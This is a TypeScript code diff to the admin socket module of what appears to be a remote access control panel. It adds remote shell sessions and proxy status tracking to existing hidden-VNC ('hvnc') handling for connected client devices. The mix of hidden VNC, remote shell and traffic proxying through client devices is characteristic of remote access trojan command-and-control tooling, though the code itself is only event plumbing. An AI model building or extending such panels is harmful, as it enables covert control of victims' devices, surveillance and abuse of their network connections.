@@ -123,6 +123,9 @@ export function initAdminSocket(onDeviceChange?: DeviceChangeListener): Socket {
     hvncSubscriptionCounts.forEach((_count, clientId) => {
       s.emit('hvnc:subscribe', { id: clientId });
     });
+    shellSubscriptionCounts.forEach((_count, clientId) => {
+      s.emit('shell:subscribe', { id: clientId });
+    });
   });
   s.on('client:connect', (payload: { id: string; model?: string; ip?: string }) => {
     onDeviceChange?.({ ...payload, online: true });
@@ -177,6 +180,15 @@ export function initAdminSocket(onDeviceChange?: DeviceChangeListener): Socket {
   s.on('hvnc:ice', (payload: WebRtcIcePayload) => {
     hvncIceListeners.forEach((fn) => fn(payload));
   });
+  s.on('shell:output', (payload: ShellOutputPayload) => {
+    shellOutputListeners.forEach((fn) => fn(payload));
+  });
+  s.on('shell:status', (payload: ShellStatusPayload) => {
+    shellStatusListeners.forEach((fn) => fn(payload));
+  });
+  s.on('proxy:status', (payload: ProxyStatusPayload) => {
+    proxyStatusListeners.forEach((fn) => fn(payload));
+  });
 
   adminSocket = s;
   return s;
@@ -202,6 +214,9 @@ export function disconnectAdminSocket(): void {
   hvncErrorListeners.clear();
   hvncAnswerListeners.clear();
   hvncIceListeners.clear();
+  shellOutputListeners.clear();
+  shellStatusListeners.clear();
+  proxyStatusListeners.clear();
 }
 
 export function onDataUpdate(listener: DataChangeListener): () => void {
@@ -309,4 +324,80 @@ export function onHvncAnswer(listener: HvncAnswerListener): () => void {
 export function onHvncIce(listener: HvncIceListener): () => void {
   hvncIceListeners.add(listener);
   return () => { hvncIceListeners.delete(listener); };
+}
+
+// ─── Shell Socket Functions ──────────────────────────────────────
+
+export interface ShellOutputPayload {
+  id: string;
+  sessionId: string;
+  output: string;
+  exitCode: number | null;
+}
+
+export interface ShellStatusPayload {
+  id: string;
+  sessionId: string;
+  action?: string;
+  success?: boolean;
+  enabled?: boolean;
+}
+
+type ShellOutputListener = (payload: ShellOutputPayload) => void;
+type ShellStatusListener = (payload: ShellStatusPayload) => void;
+
+const shellOutputListeners: Set<ShellOutputListener> = new Set();
+const shellStatusListeners: Set<ShellStatusListener> = new Set();
+const shellSubscriptionCounts: Map<string, number> = new Map();
+
+/** Subscribe this browser to shell output for a specific device. */
+export function subscribeToShell(clientId: string): () => void {
+  const count = shellSubscriptionCounts.get(clientId) ?? 0;
+  shellSubscriptionCounts.set(clientId, count + 1);
+  if (count === 0) adminSocket?.emit('shell:subscribe', { id: clientId });
+
+  return () => {
+    const next = (shellSubscriptionCounts.get(clientId) ?? 1) - 1;
+    if (next <= 0) {
+      shellSubscriptionCounts.delete(clientId);
+      adminSocket?.emit('shell:unsubscribe', { id: clientId });
+    } else {
+      shellSubscriptionCounts.set(clientId, next);
+    }
+  };
+}
+
+export function onShellOutput(listener: ShellOutputListener): () => void {
+  shellOutputListeners.add(listener);
+  return () => { shellOutputListeners.delete(listener); };
+}
+
+export function onShellStatus(listener: ShellStatusListener): () => void {
+  shellStatusListeners.add(listener);
+  return () => { shellStatusListeners.delete(listener); };
+}
+
+// ─── Proxy Socket Functions ──────────────────────────────────────
+
+export interface ProxyStatusPayload {
+  clientId?: string;
+  running: boolean;
+  port?: number;
+}
+
+export interface ProxyConnectionPayload {
+  connId: string;
+  target: string;
+  bytesToTarget: number;
+  bytesFromTarget: number;
+  duration: number;
+}
+
+type ProxyStatusListener = (payload: ProxyStatusPayload) => void;
+
+const proxyStatusListeners: Set<ProxyStatusListener> = new Set();
+
+export function onProxyStatus(listener: ProxyStatusListener): () => void {
+  proxyStatusListeners.add(listener);
+  return () => { proxyStatusListeners.delete(listener); };
 }
